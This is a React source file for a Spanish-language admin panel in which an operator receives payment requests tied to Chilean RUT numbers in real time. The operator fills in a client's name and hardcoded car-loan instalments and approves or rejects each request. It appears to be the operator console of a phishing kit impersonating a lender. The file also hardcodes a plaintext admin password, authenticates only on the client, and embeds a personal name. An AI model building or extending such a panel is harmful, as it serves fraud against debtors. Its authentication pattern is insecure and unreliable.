import React, { useState, useEffect } from "react";
import { RouteComponentProps } from "wouter";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { useWebSocket } from "@/hooks/use-websocket";

interface QuotaInfo {
  contractNumber: string;
  licensePlate: string;
  vehicleType: string;
  pacPatActive: boolean;
  quotaNumber: string;
  quotaAmount: string;
  interestAmount: string;
  totalAmount: string;
  daysUntilDue: number;
}

interface PaymentRequest {
  id: string;
  rut: string;
  status: 'pending' | 'processing' | 'completed' | 'rejected';
  timestamp: number;
  response?: string;
  clientName?: string;
  provider?: string;
  quotas?: QuotaInfo[];
  redirectUrl?: string;
}

export default function AdminQuotasPanel(_props: RouteComponentProps) {
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    const auth = sessionStorage.getItem('adminAuth');
    return auth === 'true';
  });
  const [password, setPassword] = useState('');
  const [requests, setRequests] = useState<PaymentRequest[]>([]);
  const [selectedRequest, setSelectedRequest] = useState<PaymentRequest | null>(null);
  const [response, setResponse] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.trim() === 'Nina1010@') {
      sessionStorage.setItem('adminAuth', 'true');
      setIsAuthenticated(true);
      await fetchRequests(); // Cargar las solicitudes después de autenticar
    } else {
      alert('Contraseña incorrecta');
      setPassword('');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
          <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">Admin Login</h2>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Contraseña
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
            >
              Ingresar
            </button>
          </form>
        </div>
      </div>
    );
  }
  
  // Datos del cliente
  const [clientName, setClientName] = useState('');
  const [clientRut, setClientRut] = useState('');
  
  // Cuotas a pagar
  const [quotas, setQuotas] = useState<QuotaInfo[]>([
    {
      contractNumber: "744530",
      licensePlate: "XX•XX•XX",
      vehicleType: "PEUGEOT XXXXX 2025",
      pacPatActive: true,
      quotaNumber: "6",
      quotaAmount: "$1.358.270",
      interestAmount: "$0",
      totalAmount: "$1.358.270",
      daysUntilDue: 4
    },
    {
      contractNumber: "1210457",
      licensePlate: "XX•XX•XX",
      vehicleType: "CHEVROLET XXXXXXXXX 2023",
      pacPatActive: true,
      quotaNumber: "2",
      quotaAmount: "$917.539",
      interestAmount: "$0",
      totalAmount: "$917.539",
      daysUntilDue: 1
    }
  ]);
  
  // Cargar solicitudes desde la API REST
  const fetchRequests = async () => {
    try {
      console.log('Obteniendo solicitudes del servidor...');
      const response = await fetch('/api/payment-requests');
      if (!response.ok) {
        throw new Error('Error al obtener las solicitudes');
      }
      const data = await response.json();
      console.log('Solicitudes obtenidas:', data);
      setRequests(data || []);
    } catch (error) {
      console.error('Error fetching requests:', error);
    }
  };
  
  // Cargar solicitudes al montar
  useEffect(() => {
    fetchRequests();
  }, []);
  
  // Connect to WebSocket (solo para actualizaciones en tiempo real)
  const { status, lastMessage, sendJsonMessage } = useWebSocket({
    url: `/ws?type=admin`,
    onMessage: (event) => {
      try {
        console.log('Admin panel received message:', event.data);
        const data = JSON.parse(event.data);
        console.log('Admin panel parsed message:', data);
        
        // Actualizamos la lista completa después de cada actualización
        if (data.type === 'request_updated' || data.type === 'new_request') {
          console.log('Solicitud actualizada o nueva, refrescando lista completa...');
          fetchRequests();
          
          // Además, actualizar la seleccionada si corresponde
          if (data.type === 'request_updated' && selectedRequest?.id === data.request.id) {
            console.log('Actualizando solicitud seleccionada:', data.request);
            setSelectedRequest(data.request);
          }
        }
      } catch (err) {
        console.error('Error parsing WebSocket message:', err);
      }
    }
  });
  
  // Format date
  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString('es-ES');
  };
  
  // Handle request selection
  const handleSelectRequest = (request: PaymentRequest) => {
    setSelectedRequest(request);
    setClientRut(request.rut);
    
    // Si hay datos de nombre de cliente guardados, los usamos
    if (request.clientName) {
      setClientName(request.clientName);
    } else {
      // Esto es para la demo - en un caso real se obtendría del backend
      setClientName("CRISTIAN SERVANDO VALENZUELA BUSTOS");
    }
    
    // Mark as processing if it's pending
    if (request.status === 'pending') {
      const updatedRequest = { ...request, status: 'processing' as const };
      
      sendJsonMessage({
        type: 'update_request',
        request: updatedRequest
      });
      
      // También actualizar mediante API REST para garantizar persistencia
      updateRequestViaAPI(updatedRequest);
    }
    
    // También inicializar los estados de respuesta y demás datos
    setResponse(request.response || '');
  };
  
  // Handle approval
  const handleApprove = async () => {
    if (!selectedRequest) return;
    
    const updatedRequest = {
      ...selectedRequest,
      status: 'completed' as const,
      response,
      clientName,
      quotas
    };
    
    try {
      await updateRequestViaAPI(updatedRequest);
      
      // También enviar por WebSocket para actualización inmediata
      sendJsonMessage({
        type: 'update_request',
        request: updatedRequest
      });
      
      console.log('Solicitud aprobada con éxito:', updatedRequest);
      
      // Actualizar inmediatamente la UI
      setSelectedRequest(updatedRequest);
      
      // Recargar todas las solicitudes para mantener sincronía
      fetchRequests();
    } catch (error) {
      console.error('Error al aprobar la solicitud:', error);
    }
  };
  
  // Handle rejection
  const handleReject = async () => {
    if (!selectedRequest) return;
    
    const updatedRequest = {
      ...selectedRequest,
      status: 'rejected' as const,
      response
    };
    
    try {
      await updateRequestViaAPI(updatedRequest);
      
      // También enviar por WebSocket para actualización inmediata
      sendJsonMessage({
        type: 'update_request',
        request: updatedRequest
      });
      
      console.log('Solicitud rechazada con éxito:', updatedRequest);
      
      // Actualizar inmediatamente la UI
      setSelectedRequest(updatedRequest);
      
      // Recargar todas las solicitudes para mantener sincronía
      fetchRequests();
    } catch (error) {
      console.error('Error al rechazar la solicitud:', error);
    }
  };
  
  // Update request via API
  const updateRequestViaAPI = async (updatedRequest: PaymentRequest) => {
    try {
      const response = await fetch(`/api/payment-request/${updatedRequest.id}/update`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(updatedRequest)
      });
      
      if (!response.ok) {
        throw new Error('Error al actualizar la solicitud');
      }
      
      return await response.json();
    } catch (error) {
      console.error('Error updating request:', error);
      throw error;
    }
  };
  
  // Get status badge color
  const getStatusBadgeVariant = (status: string): "secondary" | "default" | "destructive" | "outline" => {
    switch (status) {
      case 'pending': return 'secondary';
      case 'processing': return 'default';
      case 'completed': return 'outline';
      case 'rejected': return 'destructive';
      default: return 'default';
    }
  };
  
  // Get status text
  const getStatusText = (status: string) => {
    switch (status) {
      case 'pending': return 'Pendiente';
      case 'processing': return 'En proceso';
      case 'completed': return 'Completado';
      case 'rejected': return 'Rechazado';
      default: return status;
    }
  };
  
  return (
    <div className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-7xl mx-auto">
        <header className="bg-white p-4 rounded-lg shadow mb-6">
          <h1 className="text-2xl font-bold text-primary">Panel de Administración</h1>
          <p className="text-sm text-gray-500">
            Estado de la conexión: {status === 'open' ? 'Conectado' : status}
          </p>
        </header>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Requests List */}
          <Card className="p-4 lg:col-span-1 h-[calc(100vh-180px)] overflow-auto">
            <h2 className="text-lg font-semibold mb-4">Solicitudes de Pago</h2>
            
            {requests.length === 0 ? (
              <p className="text-gray-500 text-center py-8">
                No hay solicitudes pendientes
              </p>
            ) : (
              <div className="space-y-3">
                {requests.map(request => (
                  <div 
                    key={request.id}
                    className={`p-3 border rounded-lg cursor-pointer transition-colors hover:bg-gray-50 
                      ${selectedRequest?.id === request.id ? 'border-primary bg-blue-50' : 'border-gray-200'}`}
                    onClick={() => handleSelectRequest(request)}
                  >
                    <div className="flex justify-between items-center">
                      <div>
                        <p className="font-medium">RUT: <span className="text-base">{request.rut}</span></p>
                        <p className="text-xs text-gray-500">{formatDate(request.timestamp)}</p>
                        {request.provider && (
                          <p className="text-xs text-gray-600 mt-1">
                            Proveedor: <span className="font-medium">{request.provider}</span>
                          </p>
                        )}
                      </div>
                      <div className="flex items-center gap-2">
                        <Badge variant={getStatusBadgeVariant(request.status)}>
                          {getStatusText(request.status)}
                        </Badge>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            navigator.clipboard.writeText(request.rut);
                            alert('RUT copiado al portapapeles');
                          }}
                          className="p-2 hover:bg-gray-100 rounded-full"
                          title="Copiar RUT"
                        >
                          <svg 
                            xmlns="http://www.w3.org/2000/svg" 
                            width="20" 
                            height="20" 
                            viewBox="0 0 24 24" 
                            fill="none" 
                            stroke="currentColor" 
                            strokeWidth="2" 
                            strokeLinecap="round" 
                            strokeLinejoin="round"
                          >
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                          </svg>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
          
          {/* Request Details */}
          <Card className="p-4 lg:col-span-2 h-[calc(100vh-180px)] overflow-auto">
            {!selectedRequest ? (
              <div className="flex flex-col items-center justify-center h-full">
                <p className="text-gray-500 mb-2">Selecciona una solicitud para ver los detalles</p>
              </div>
            ) : (
              <div>
                <div className="flex justify-between items-start mb-6">
                  <div>
                    <h2 className="text-xl font-semibold">{clientName || selectedRequest.rut}</h2>
                    <p className="text-sm text-gray-500">{formatDate(selectedRequest.timestamp)}</p>
                  </div>
                  <Badge variant={getStatusBadgeVariant(selectedRequest.status)} className="text-sm px-3 py-1">
                    {getStatusText(selectedRequest.status)}
                  </Badge>
                </div>
                
                {(selectedRequest.status === 'pending' || selectedRequest.status === 'processing') ? (
                  <Tabs defaultValue="client-info">
                    <TabsList className="mb-4">
                      <TabsTrigger value="client-info">Información del Cliente</TabsTrigger>
                      <TabsTrigger value="quotas">Cuotas</TabsTrigger>
                    </TabsList>
                    
                    <TabsContent value="client-info" className="space-y-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                          Nombre del Cliente
                        </label>
                        <Input 
                          value={clientName}
                          onChange={(e) => setClientName(e.target.value)}
                          placeholder="Nombre completo del cliente"
                          className="w-full"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                          RUT del Cliente
                        </label>
                        <Input 
                          value={clientRut}
                          onChange={(e) => setClientRut(e.target.value)}
                          placeholder="RUT del cliente"
                          className="w-full"
                          disabled
                        />
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                          Mensaje de respuesta (opcional)
                        </label>
                        <Textarea 
                          value={response}
                          onChange={(e) => setResponse(e.target.value)}
                          placeholder="Escribe un mensaje para el cliente..."
                          className="w-full h-24"
                        />
                      </div>
                    </TabsContent>
                    
                    <TabsContent value="quotas" className="space-y-6">
                      <div className="space-y-4">
                        <div className="border rounded-lg overflow-hidden">
                          <div className="bg-blue-50 p-3 border-b">
                            <h3 className="font-medium">Cuotas a Pagar</h3>
                          </div>
                          
                          <div className="divide-y">
                            {quotas.map((quota, index) => (
                              <div key={index} className="p-4">
                                <div className="grid grid-cols-2 gap-4 mb-3">
                                  <div>
                                    <p className="text-xs text-gray-500">Nº Contrato</p>
                                    <p className="font-medium">{quota.contractNumber}</p>
                                  </div>
                                  <div>
                                    <p className="text-xs text-gray-500">Patente</p>
                                    <p className="font-medium">{quota.licensePlate}</p>
                                  </div>
                                </div>
                                
                                <div className="mb-3">
                                  <p className="text-xs text-gray-500">Vehículo</p>
                                  <p className="font-medium">{quota.vehicleType}</p>
                                </div>
                                
                                <div className="grid grid-cols-4 gap-4 mb-3">
                                  <div>
                                    <p className="text-xs text-gray-500">Nº Cuota</p>
                                    <p className="font-medium">{quota.quotaNumber}</p>
                                  </div>
                                  <div>
                                    <p className="text-xs text-gray-500">Monto Cuota</p>
                                    <p className="font-medium">{quota.quotaAmount}</p>
                                  </div>
                                  <div>
                                    <p className="text-xs text-gray-500">Interés Mora</p>
                                    <p className="font-medium">{quota.interestAmount}</p>
                                  </div>
                                  <div>
                                    <p className="text-xs text-gray-500">Total</p>
                                    <p className="font-medium text-primary">{quota.totalAmount}</p>
                                  </div>
                                </div>
                                
                                <div>
                                  <p className="text-xs text-gray-500">Vencimiento</p>
                                  <Badge variant={quota.daysUntilDue <= 0 ? 'destructive' : 'outline'}>
                                    {quota.daysUntilDue <= 0 ? 'Vencida' : `${quota.daysUntilDue} días`}
                                  </Badge>
                                </div>
                                
                                {index < quotas.length - 1 && (
                                  <div className="border-t my-4 pt-2">
                                    <hr className="my-4" />
                                  </div>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </TabsContent>
                  </Tabs>
                ) : (
                  <div className="space-y-6">
                    <div className="bg-gray-50 p-4 rounded-lg">
                      <h3 className="font-medium mb-2">{selectedRequest.status === 'completed' ? 'Solicitud Aprobada' : 'Solicitud Rechazada'}</h3>
                      <p>{selectedRequest.response || 'No se proporcionó un mensaje.'}</p>
                    </div>
                    
                    {selectedRequest.status === 'completed' && selectedRequest.quotas && (
                      <div className="border rounded-lg overflow-hidden">
                        <div className="bg-blue-50 p-3 border-b">
                          <h3 className="font-medium">Cuotas Incluidas</h3>
                        </div>
                        <div className="p-4 divide-y">
                          {selectedRequest.quotas.map((quota, index) => (
                            <div key={index} className="py-3">
                              <div className="grid grid-cols-2 gap-4 mb-2">
                                <div>
                                  <span className="text-sm text-gray-500">Contrato:</span> {quota.contractNumber}
                                </div>
                                <div>
                                  <span className="text-sm text-gray-500">Vehículo:</span> {quota.vehicleType}
                                </div>
                              </div>
                              <div className="grid grid-cols-3 gap-4">
                                <div>
                                  <span className="text-sm text-gray-500">Cuota:</span> {quota.quotaAmount}
                                </div>
                                <div>
                                  <span className="text-sm text-gray-500">Interés:</span> {quota.interestAmount}
                                </div>
                                <div>
                                  <span className="text-sm text-gray-500">Total:</span> {quota.totalAmount}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}
                
                {(selectedRequest.status === 'pending' || selectedRequest.status === 'processing') && (
                  <div className="flex justify-end space-x-4 mt-6">
                    <Button 
                      variant="outline" 
                      onClick={handleReject}
                    >
                      Rechazar
                    </Button>
                    <Button 
                      onClick={handleApprove}
                    >
                      Aprobar
                    </Button>
                  </div>
                )}
              </div>
            )}
          </Card>
        </div>
      </div>
    </div>
  );
}